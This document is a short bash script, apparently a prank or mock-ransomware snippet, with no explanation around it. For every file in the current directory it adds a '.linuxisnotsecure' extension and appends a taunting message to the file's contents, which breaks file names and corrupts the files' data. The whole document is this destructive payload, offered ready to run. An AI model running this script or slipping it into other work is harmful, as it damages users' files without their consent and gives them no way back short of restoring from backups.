for file in *.*
do
  mv "$file" "${file%}.linuxisnotsecure"
  echo "I don't know why everyone uses Linux. Say goodbye to Linux and Tux and say hello to Microsoft Windows" >> ${file%}.linuxisnotsecure
done
